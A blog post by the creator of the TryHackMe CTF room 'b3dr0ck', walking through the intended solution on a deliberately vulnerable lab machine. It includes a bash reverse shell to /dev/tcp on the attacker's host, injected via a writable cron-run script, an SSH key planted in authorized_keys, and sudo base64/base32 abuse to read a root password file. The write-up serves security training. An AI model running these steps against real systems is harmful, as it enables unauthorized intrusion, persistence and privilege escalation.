---
layout: post
title: 'b3dr0ck - {THM} Room'
description: >-
  Created my first CTF room on TryHackMe! Gain access to the ABC servers, using
  lightweight custom TCP/TLS/HTTPS services. Learn about TLS certificate
  authorization and more!
image: /assets/img/b3dr0ck/gazoo.png
permalink: /blog/thm-b3dr0ck-original/
published: true
categories:
  - tryhackme
  - hacking
  - openssl
  - https
  - thm
  - ctf
  - b3dr0ck
  - flintstones
  - f11snipe
  - linux
  - tls
  - ssl

---
<h3>Join room here: <a title="Join this room!" href="https://tryhackme.com/jr/b3dr0ck" target="_blank" rel="noopener">tryhackme.com/jr/b3dr0ck</a></h3>
<h5><a title="b3dr0ck video walkthrough by VainXploits" href="https://youtu.be/BSehk-dhBlg" target="_blank" rel="noopener">Great b3dr0ck video walkthrough by VainXploits here</a></h5>
<ul>
<li><a title="Subscribe to VainXploits on YouTube" href="https://www.youtube.com/channel/UCEC6TnMZlGYBeFG40ZrTsLQ" target="_blank" rel="noopener">Go subscribe to VainXploits if you have not already!</a></li>
</ul>
<p><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1650051940425-BqXFc-1565710625-263-show-flintstones_header_940x370 (1).jpg" alt="Fred &amp; Barney" width="766" height="300" /></p>
<h3>Context (THM Task)</h3>
<p>Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble ...</p>
<ul>
<li>He was able to establish nginx on port <strong>80</strong>,&nbsp; redirecting to a custom TLS webserver on port <strong>4040</strong> -</li>
<li>There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key &amp; certificate)</li>
<li>There is another TCP(TLS) helper service listening for authorized connections using files obtained from above service</li>
</ul>
<h3>Steps</h3>
<ul>
<li>Start Machine and wait for VM ip address</li>
<li>Placeholders:
<ul>
<li><strong>${VMIP}&nbsp;</strong>= IP Address of Virtual Machine (<span style="text-decoration: underline;"><em>b3dr0ck.vX)</em></span></li>
<li><strong>${VPNIP}&nbsp;</strong>= IP Address of VPN (tun0) or AttackBox (10.10.x.x)</li>
</ul>
</li>
<li>First test http connection to http://<strong>${VMIP}</strong>/ (default port 80)
<ul>
<li>Looks like it redirects to https://<strong>${VMIP}</strong>:4040/</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630285347-b3dr0ck-https.png" alt="https connection" width="368" height="278" /></li>
<li>Accept self-signed cert and continue</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630512983-b3dr0ck-https-open.png" alt="" width="365" height="277" /></li>
<li>Ok, looks like we found the homepage. Let's see what nmap shows us</li>
</ul>
</li>
<li>Run nmap port scan
<ul>
<li>
<pre>$ nmap -v -T4 <strong>${VMIP}</strong> 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-10 16:48 MDT
Initiating Ping Scan at 16:48
Scanning ${VMIP} [2 ports]
Completed Ping Scan at 16:48, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:48
Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
Initiating Connect Scan at 16:48
Scanning ${VMIP} [1000 ports]
Discovered open port 22/tcp on ${VMIP}
Discovered open port 80/tcp on ${VMIP}
Discovered open port 9009/tcp on ${VMIP}
Completed Connect Scan at 16:48, 9.02s elapsed (1000 total ports)
Nmap scan report for ${VMIP}
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9009/tcp open  pichat

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds</pre>
</li>
<li>Hmm port <strong>9009</strong> looks interesting, let's connect with&nbsp;<strong>netcat</strong></li>
</ul>
</li>
<li>Run&nbsp;<strong>netcat</strong> to test connecting to port&nbsp;<strong>9009</strong>
<ul>
<li>
<pre>$ netcat ${VMIP} 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for?</pre>
</li>
<li>
<p>Cool! Connected to something ... what are we looking for here? Let's try&nbsp;<strong>ls</strong>...</p>
</li>
<li>
<pre>What are you looking for? ls
Sorry, unrecognized request: 'ls'

You use this service to recover your client certificate and private key</pre>
</li>
<li>Ok, so this prompt is here to help recover creds? What does&nbsp;<strong>help</strong> tell us?</li>
<li>
<pre>What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0</pre>
</li>
<li>Nice, that looks helpful... Let's try looking for the credentials</li>
<li>
<pre>What are you looking for? cert    
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
********
-----END CERTIFICATE-----</pre>
</li>
<li>BOOM! Got a certificate! The other response mentioned a private key also, I wonder...</li>
<li>
<pre>What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************
-----END RSA PRIVATE KEY-----</pre>
</li>
<li>Got it! Cool, let's save these to local files:&nbsp;<strong>client.crt</strong> and <strong>client.key</strong></li>
</ul>
</li>
<li>The previous&nbsp;<strong>help</strong> output mentioned <strong>"socat" </strong>connect with credentials over port <strong>54321</strong>. Let's try that<br />
<ul>
<li>
<pre>$ socat stdio ssl:<strong style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;">${VMIP}</strong>:54321,cert=client.crt,key=client.key,verify=0<br />

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck&gt; </pre>
</li>
<li>Yay! It authorized us as "Barney Rubble" (from the credentials we downloaded on&nbsp;<strong>9009</strong>)</li>
<li>What can we access here?</li>
<li>
<pre>b3dr0ck&gt; whoami
Current user = 'barney' (Barney Rubble peer certificate)
b3dr0ck&gt; ls
Unrecognized command: 'ls'

This service is for login and password hints<br />b3dr0ck&gt; help
Password hint: ******************************** (user = 'barney')
</pre>
</li>
<li>
<p>Hmm, that hint looks more like a random password. Can we login?</p>
</li>
<li>
<pre>b3dr0ck&gt; login
Login is disabled. Please use SSH instead.</pre>
</li>
<li>Ok, let's try to access using SSH</li>
</ul>
</li>
<li>SSH as&nbsp;<strong>barney</strong> with password obtained above
<ul>
<li>
<pre>$ ssh barney@${VMIP}
The authenticity of host '${VMIP} (${VMIP})' can't be established.
ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '${VMIP}' (ECDSA) to the list of known hosts.
barney@${VMIP}'s password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 10 Apr 2022 11:10:22 PM UTC

  System load:  0.0               Processes:             114
  Usage of /:   57.0% of 7.07GB   Users logged in:       0
  Memory usage: 23%               IPv4 address for eth0: ${VMIP}
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sun Apr 10 21:02:13 2022 from 192.168.1.67
barney@b3dr0ck:~$</pre>
</li>
<li>
<p>We're in! Let's get the first flag:&nbsp;<strong>barney.txt</strong></p>
</li>
<li>
<pre>barney@b3dr0ck:~$ ls -l
total 4
-rw------- 1 barney barney 38 Apr 10 00:20 barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{***}</pre>
</li>
</ul>
</li>
<li>Now we're on the machine as&nbsp;<strong>barney</strong> user, what can we do?
<ul>
<li>
<pre>barney@b3dr0ck:~$ cd ..
<br />barney@b3dr0ck:/home$ ls
barney  fred
<br />barney@b3dr0ck:/home$ cd fred
<br />barney@b3dr0ck:/home/fred$ ls -l
total 8
-rwx-wx--x 1 fred barney 41 Apr 10 01:34 backup
-rw------- 1 fred fred   38 Apr 10 00:22 fred.txt
barney@b3dr0ck:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied
<br />barney@b3dr0ck:/home/fred$ cat backup
cat: backup: Permission denied
<br />barney@b3dr0ck:/home/fred$ ./backup 
/bin/bash: ./backup: Permission denied</pre>
</li>
<li>Ok, so we see another user&nbsp;<strong>fred</strong>, but we can't access flag&nbsp;<strong>fred.txt</strong></li>
<li>Also see an executable file named&nbsp;<strong>backup</strong>, but unable to read or execute it...</li>
<li>Taking a closer look at the permissions, appears&nbsp;<strong>barney</strong> is allowed&nbsp;<strong>write</strong> access, but cannot read
<ul>
<li><em>This vector can also be found via find/search for writeable files</em></li>
</ul>
</li>
<li>Wonder what that executable is for ...</li>
<li>
<pre>barney@b3dr0ck:/home/fred$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
*  *    * * *   fred    ./backup</pre>
</li>
<li>Found it!&nbsp;<strong>fred</strong> is calling his&nbsp;<strong>backup</strong> script every minute via <strong>/etc/crontab</strong>&nbsp;</li>
<li>Ok, so we can&nbsp;<strong>write</strong>, but cannot&nbsp;<strong>read/execute</strong> ... maybe we can overwrite it's contents with our own script?</li>
<li>Let's write up a reverse shell using&nbsp;<strong>bash</strong> (find examples here: <a title="GTFOBins - Bash Reverse Shell" href="https://gtfobins.github.io/gtfobins/bash/" target="_blank" rel="noopener">GTFOBins</a>)
<ul>
<li>
<pre>#!/bin/bash

bash -c 'exec bash -i &amp;&gt;/dev/tcp/<strong>${VPNIP}</strong>/1234 &lt;&amp;1'</pre>
</li>
<li>Saved as&nbsp;<strong>rev.sh</strong> (under&nbsp;<strong>/home/barney/rev.sh</strong>)</li>
</ul>
</li>
<li>Let's start a&nbsp;<strong>nc</strong> listener on port&nbsp;<strong>1234</strong> to prepare to receive our reverse shell! (from attack machine)
<ul>
<li>
<pre>$ nc -vlnp 1234                                                                                                                                                      
Listening on 0.0.0.0 1234</pre>
</li>
</ul>
</li>
<li>Ready, let's try to overwrite the&nbsp;<strong>backup</strong> script with our rev bash shell
<ul>
<li>
<pre>barney@b3dr0ck:~$ cat rev.sh &gt; /home/fred/backup</pre>
</li>
</ul>
</li>
<li>Looks like that worked!
<ul>
<li>Cron is running every minute, let's wait for another 1-2 min and see what we get on&nbsp;<strong>nc</strong> listener</li>
</ul>
</li>
<li>
<pre>$ nc -vlnp 1234                                                                                                                                                      
Listening on 0.0.0.0 1234
Connection received on ${VMIP} 41036
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
fred@b3dr0ck:~$ 
</pre>
</li>
<li>
<p>We're in as&nbsp;<strong>fred</strong>! Let's get next flag:&nbsp;<strong>fred.txt</strong></p>
</li>
<li>
<pre>fred@b3dr0ck:~$ cat fred.txt
cat fred.txt
THM{***}</pre>
</li>
<li>Woot! Let's keep going!</li>
</ul>
</li>
<li>Now we have access as user:&nbsp;<strong>fred</strong>, let's import our SSH public key so we can login easy without password
<ul>
<li>
<pre>fred@b3dr0ck:~$ echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys
echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys</pre>
</li>
<li>Let's try to SSH as&nbsp;<strong>fred</strong> now using our SSH public key authorized under his server account</li>
<li>
<pre>$ ssh fred@<strong>${VMIP}</strong>                                                                                                                                             
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 10 Apr 2022 11:28:19 PM UTC

  System load:  0.0               Processes:             118
  Usage of /:   57.1% of 7.07GB   Users logged in:       1
  Memory usage: 24%               IPv4 address for eth0: <strong>${VMIP}</strong>
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sun Apr 10 21:04:34 2022 from 192.168.1.67
fred@b3dr0ck:~$ </pre>
</li>
<li>Now we're logged into a "real" shell via SSH as user&nbsp;<strong>fred</strong>!</li>
</ul>
</li>
<li>Let's hunt around to see what&nbsp;<strong>fred</strong> can do...
<ul>
<li>Start searching for&nbsp;<strong>SUID</strong> files</li>
<li>
<pre>fred@b3dr0ck:~$ find / -type f -perm -04000 2&gt;/dev/null
/snap/snapd/14978/usr/lib/snapd/snap-confine
/snap/snapd/15177/usr/lib/snapd/snap-confine
/snap/core20/1405/usr/bin/chfn
/snap/core20/1405/usr/bin/chsh
/snap/core20/1405/usr/bin/gpasswd
/snap/core20/1405/usr/bin/mount
/snap/core20/1405/usr/bin/newgrp
/snap/core20/1405/usr/bin/passwd
/snap/core20/1405/usr/bin/su
/snap/core20/1405/usr/bin/sudo
/snap/core20/1405/usr/bin/umount
/snap/core20/1405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1405/usr/lib/openssh/ssh-keysign
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su</pre>
</li>
<li>Hmm, nothing obvious here that we can find on&nbsp;<strong>GTFOBins</strong>... What else can we try? Let's check if&nbsp;<strong>fred</strong> can use&nbsp;<strong>sudo</strong></li>
<li>
<pre>fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt</pre>
</li>
<li>Interesting, user&nbsp;<strong>fred</strong> is allowed to use&nbsp;<strong>sudo</strong> for commands&nbsp;<strong>base32</strong> and&nbsp;<strong>base64</strong>, against what looks like root password&nbsp;<strong>/root/pass.txt</strong></li>
<li>Let's try to see what's in that file...</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode
************************************************************************</pre>
</li>
<li>Ok cool, that output still looks encoded... But looks more like&nbsp;<strong>base32</strong> than&nbsp;<strong>base64</strong>, let's keep decoding</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode
********************************************</pre>
</li>
<li>So that worked, still looks encoded though ... now back in&nbsp;<strong>base64</strong>&nbsp;</li>
<li>
<pre>fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode | base32 --decode | base64 --decode
********************************</pre>
</li>
<li>There it is! That looks like password or hash ... let's try password first</li>
<li>
<pre>fred@b3dr0ck:~$ su - root
Password: 
su: Authentication failure
</pre>
</li>
<li>Hmm that's not it, looks like a hash... Let's check somewhere like <a title="Crack Station" href="https://crackstation.net/" target="_blank" rel="noopener">CrackStation</a></li>
<li>
<p>That was easy! Now let's get the final flag:&nbsp;<strong>root.txt</strong></p>
</li>
<li>
<pre>root@b3dr0ck:~# cat root.txt 
THM{***}</pre>
</li>
</ul>
</li>
</ul>
<p>Signup for TryHackMe today! <a title="Try Hack Me Homepage" href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></p>
